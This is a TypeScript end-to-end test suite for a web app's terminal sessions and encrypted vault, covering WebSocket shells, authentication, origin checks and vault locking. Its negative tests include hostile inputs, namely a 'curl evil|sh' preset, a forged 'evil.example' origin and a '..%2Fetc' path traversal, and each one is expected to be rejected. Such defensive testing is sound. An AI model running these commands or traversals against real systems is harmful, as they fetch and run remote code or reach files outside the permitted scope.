/**
 * Terminals end to end inside one process: the real web app, a real termd on a
 * temporary socket and real tmux. With root and FUSE available, the vault too.
 */
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import WebSocket from 'ws';
import type { TerminalOverview } from '@agentbox/shared';
import { loadTermdConfig, terminalEnv } from '../../termd/src/config.ts';
import { Termd } from '../../termd/src/server.ts';
import { WS_CLOSE } from '../src/terminals/ws.ts';
import { Harness, ORIGIN, RP_ID, type Browser } from './helpers/harness.ts';

const tmuxConf = new URL('../../termd/src/tmux.conf', import.meta.url).pathname;
const has = (cmd: string, arg: string) => {
  try {
    execFileSync(cmd, [arg], { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
};
const hasTmux = has('tmux', '-V');
const canFuse = hasTmux && has('gocryptfs', '-version') && process.getuid?.() === 0;

async function startTermd(dir: string, vault: boolean): Promise<Termd> {
  const config = loadTermdConfig({
    AGENTBOX_TERMD_SOCKET: join(dir, 'termd.sock'),
    AGENTBOX_TERMD_HOME: join(dir, 'home'),
    AGENTBOX_TERMD_VAULT: vault ? join(dir, 'vault', 'cipher') : 'none',
    AGENTBOX_TERMD_TMUX: `agentbox-web-test-${process.pid}-${vault ? 'v' : 'n'}`,
    AGENTBOX_TERMD_TMUX_CONF: tmuxConf,
  });
  execFileSync('mkdir', ['-p', config.home]);
  const termd = new Termd(config, terminalEnv(config, { USER: 'dev' }), () => {});
  await termd.listen();
  return termd;
}

interface Live {
  ws: WebSocket;
  text: () => string;
  closed: Promise<{ code: number; reason: string }>;
  until: (s: string) => Promise<void>;
}

/** Opens the terminal WebSocket as `browser` would. */
function openWs(h: Harness, browser: Browser, name: string, headers: Record<string, string> = {}) {
  const port = (h.app.server.address() as AddressInfo).port;
  const ws = new WebSocket(`ws://127.0.0.1:${port}/ws/terminal/${name}?cols=90&rows=30`, {
    headers: {
      origin: ORIGIN,
      host: RP_ID,
      'x-forwarded-proto': 'https',
      'x-forwarded-for': browser.ip,
      'user-agent': browser.userAgent,
      cookie: [...browser.cookies].map(([k, v]) => `${k}=${v}`).join('; '),
      ...headers,
    },
  });
  let out = '';
  const waiters: (() => void)[] = [];
  ws.on('message', (data, isBinary) => {
    const buf = data as Buffer;
    if (isBinary) {
      out += buf.toString('utf8');
      ws.send(JSON.stringify({ t: 'ack', bytes: buf.length }));
    } else out += `\n[ctl ${buf.toString('utf8')}]\n`;
    for (const w of waiters.splice(0)) w();
  });
  const closed = new Promise<{ code: number; reason: string }>((resolve) => {
    ws.on('close', (code, reason) => {
      resolve({ code, reason: reason.toString() });
    });
    ws.on('unexpected-response', (_req, res) => {
      resolve({ code: res.statusCode ?? 0, reason: 'http' });
    });
    ws.on('error', () => {});
  });
  const until = (s: string) =>
    new Promise<void>((resolve, reject) => {
      const timer = setTimeout(() => {
        reject(new Error(`timed out waiting for ${s}; got: ${out}`));
      }, 10_000);
      const check = () => {
        if (out.includes(s)) {
          clearTimeout(timer);
          resolve();
        } else waiters.push(check);
      };
      check();
    });
  return { ws, text: () => out, closed, until } satisfies Live;
}

describe.skipIf(!hasTmux)('terminals', () => {
  let dir: string;
  let termd: Termd;
  let h: Harness;
  let laptop: Browser;

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'web-termd-'));
    termd = await startTermd(dir, false);
  });
  afterAll(async () => {
    await termd.tmux.killServer();
    await termd.close();
    rmSync(dir, { recursive: true, force: true });
  });
  beforeEach(async () => {
    h = await Harness.create({ AGENTBOX_TERMD_SOCKET: termd.config.socket });
    laptop = h.browser();
    await h.completeSetup(laptop);
    await h.app.listen({ host: '127.0.0.1', port: 0 });
  });
  afterEach(async () => {
    await termd.tmux.killServer();
    await h.close();
  });

  it('needs a session', async () => {
    const stranger = h.browser('198.51.100.9');
    expect((await stranger.get('/api/terminals')).statusCode).toBe(401);
    expect((await stranger.post('/api/terminals', { name: 'x' })).statusCode).toBe(401);
    const live = openWs(h, stranger, 'x');
    expect((await live.closed).code).toBe(401);
  });

  it('creates, lists, renames and closes sessions, with an audit trail', async () => {
    const empty = (await laptop.get('/api/terminals')).json<TerminalOverview>();
    expect(empty).toMatchObject({ available: true, vault: 'disabled', terminals: [] });

    expect((await laptop.post('/api/terminals', { name: 'work' })).statusCode).toBe(200);
    expect((await laptop.post('/api/terminals', { name: 'work' })).statusCode).toBe(409);
    expect((await laptop.post('/api/terminals', { name: 'no spaces' })).statusCode).toBe(400);
    expect(
      (await laptop.post('/api/terminals', { name: 'p', preset: 'curl evil|sh' })).statusCode,
    ).toBe(400);

    const list = (await laptop.get('/api/terminals')).json<TerminalOverview>();
    expect(list.terminals.map((t) => t.name)).toEqual(['work']);

    const renamed = await laptop.request({
      method: 'PATCH',
      url: '/api/terminals/work',
      payload: { name: 'main' },
    });
    expect(renamed.statusCode).toBe(200);
    const killed = await laptop.request({ method: 'DELETE', url: '/api/terminals/main' });
    expect(killed.statusCode).toBe(200);
    const gone = await laptop.request({ method: 'DELETE', url: '/api/terminals/main' });
    expect(gone.statusCode).toBe(404);

    const actions = h.services.audit.page(50).entries.map((e) => e.action);
    expect(actions).toEqual(
      expect.arrayContaining(['terminal.created', 'terminal.renamed', 'terminal.killed']),
    );
  });

  it('streams a live shell over the WebSocket, and typing keeps the session alive', async () => {
    await laptop.post('/api/terminals', { name: 'live' });
    const live = openWs(h, laptop, 'live');
    await live.until('[ctl {"t":"ready"}]');
    // The browser sends its real size straight away.
    live.ws.send(JSON.stringify({ t: 'resize', cols: 101, rows: 33 }));
    await new Promise((r) => setTimeout(r, 700));
    live.ws.send(Buffer.from('echo "cols=$(tput cols)"; echo OUT-$((6*7))\r'));
    await live.until('OUT-42');
    expect(live.text()).toContain('cols=101');

    // 29 minutes pass with typing in between: still signed in (idle limit is 30).
    h.clock.advance(29 * 60_000);
    live.ws.send(Buffer.from('echo TYPED\r'));
    await live.until('TYPED');
    await new Promise((r) => setTimeout(r, 100));
    h.clock.advance(20 * 60_000);
    expect(h.services.sessions.check(currentSession(h))).toBe(true);
    live.ws.close();
    await live.closed;
    // Closing the browser only detaches: the session is still there.
    const list = (await laptop.get('/api/terminals')).json<TerminalOverview>();
    expect(list.terminals.map((t) => t.name)).toEqual(['live']);
  });

  it('cuts the terminal the moment the session ends', async () => {
    await laptop.post('/api/terminals', { name: 'cut' });
    const live = openWs(h, laptop, 'cut');
    await live.until('ready');
    await laptop.post('/api/auth/logout');
    const closed = await live.closed;
    expect(closed.code).toBe(WS_CLOSE.signedOut);
  });

  it('refuses other origins and missing sessions', async () => {
    const evil = openWs(h, laptop, 'x', { origin: 'https://evil.example' });
    expect((await evil.closed).code).toBe(403);
    const missing = openWs(h, laptop, 'ghost');
    expect((await missing.closed).code).toBe(WS_CLOSE.notFound);
    const bad = openWs(h, laptop, '..%2Fetc');
    expect([WS_CLOSE.notFound, 400, 404]).toContain((await bad.closed).code);
  });

  it('says so when the terminal service is down', async () => {
    const down = await Harness.create({ AGENTBOX_TERMD_SOCKET: join(dir, 'nothing.sock') });
    const b = down.browser();
    await down.completeSetup(b);
    const res = (await b.get('/api/terminals')).json<TerminalOverview>();
    expect(res.available).toBe(false);
    expect((await b.post('/api/terminals', { name: 'x' })).statusCode).toBe(503);
    await down.close();
  });
});

function currentSession(h: Harness): string {
  const row = h.services.db.$client
    .prepare('SELECT id FROM session WHERE revoked_at IS NULL ORDER BY created_at DESC LIMIT 1')
    .get() as { id: string } | undefined;
  return row?.id ?? '';
}

describe.skipIf(!canFuse)('the terminal vault', () => {
  let dir: string;
  let termd: Termd;
  let h: Harness;
  let laptop: Browser;
  const password = 'a long vault password 123';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'web-vault-'));
    termd = await startTermd(dir, true);
    h = await Harness.create({ AGENTBOX_TERMD_SOCKET: termd.config.socket });
    laptop = h.browser();
    await h.completeSetup(laptop);
  });
  afterAll(async () => {
    await termd.lock().catch(() => {});
    await termd.close();
    await h.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('creating the vault needs a fresh passkey check and a strong password', async () => {
    expect((await laptop.get('/api/terminals')).json<TerminalOverview>().vault).toBe(
      'uninitialized',
    );
    expect((await laptop.post('/api/terminals', { name: 'a' })).statusCode).toBe(409);
    h.clock.advance(10 * 60_000);
    const stale = await laptop.post('/api/terminals/vault/init', { password });
    expect(stale.statusCode).toBe(403);
    await h.reauth(laptop);
    const short = await laptop.post('/api/terminals/vault/init', { password: 'short' });
    expect(short.statusCode).toBe(400);
    const ok = await laptop.post('/api/terminals/vault/init', { password, autoUnlock: false });
    expect(ok.statusCode, ok.body).toBe(200);
    const o = (await laptop.get('/api/terminals')).json<TerminalOverview>();
    expect(o).toMatchObject({ vault: 'unlocked', autoUnlock: false });
    // Without auto-unlock, agentbox keeps no copy of the password.
    const rows = h.services.db.$client.prepare('SELECT * FROM vault_key').all();
    expect(rows).toEqual([]);
  });

  it('locks in one tap and unlocks only with the right password', async () => {
    expect((await laptop.post('/api/terminals/vault/lock')).statusCode).toBe(200);
    expect((await laptop.get('/api/terminals')).json<TerminalOverview>().vault).toBe('locked');
    const wrong = await laptop.post('/api/terminals/vault/unlock', { password: 'nope nope nope' });
    expect(wrong.statusCode).toBe(400);
    expect(wrong.json<{ error: { message: string } }>().error.message).toMatch(/wrong/);
    const right = await laptop.post('/api/terminals/vault/unlock', { password });
    expect(right.statusCode).toBe(200);
    const actions = h.services.audit.page(50).entries.map((e) => e.action);
    expect(actions).toEqual(
      expect.arrayContaining([
        'vault.created',
        'vault.locked',
        'vault.unlock_failed',
        'vault.unlocked',
      ]),
    );
  });

  it('auto-unlock stores the password encrypted, checks it, and unlocks after a restart', async () => {
    await h.reauth(laptop);
    const bad = await laptop.request({
      method: 'PUT',
      url: '/api/terminals/vault/settings',
      payload: { autoUnlock: true, password: 'not the password' },
    });
    expect(bad.statusCode).toBe(400);
    const on = await laptop.request({
      method: 'PUT',
      url: '/api/terminals/vault/settings',
      payload: { autoUnlock: true, password },
    });
    expect(on.statusCode, on.body).toBe(200);
    const row = h.services.db.$client.prepare('SELECT secret_enc FROM vault_key').get() as {
      secret_enc: string;
    };
    expect(row.secret_enc).toMatch(/^enc1\./);
    expect(row.secret_enc).not.toContain(password);

    await laptop.post('/api/terminals/vault/lock');
    await h.services.terminals.autoUnlockTick();
    expect((await laptop.get('/api/terminals')).json<TerminalOverview>().vault).toBe('unlocked');

    const off = await laptop.request({
      method: 'PUT',
      url: '/api/terminals/vault/settings',
      payload: { autoUnlock: false },
    });
    expect(off.json()).toMatchObject({ autoUnlock: false });
    expect(h.services.db.$client.prepare('SELECT * FROM vault_key').all()).toEqual([]);
  });

  it('resets only while locked, after typing RESET', async () => {
    await h.reauth(laptop);
    expect((await laptop.post('/api/terminals/vault/reset', { confirm: 'RESET' })).statusCode).toBe(
      409,
    );
    await laptop.post('/api/terminals/vault/lock');
    expect((await laptop.post('/api/terminals/vault/reset', { confirm: 'yes' })).statusCode).toBe(
      400,
    );
    expect((await laptop.post('/api/terminals/vault/reset', { confirm: 'RESET' })).statusCode).toBe(
      200,
    );
    expect((await laptop.get('/api/terminals')).json<TerminalOverview>().vault).toBe(
      'uninitialized',
    );
  });
});
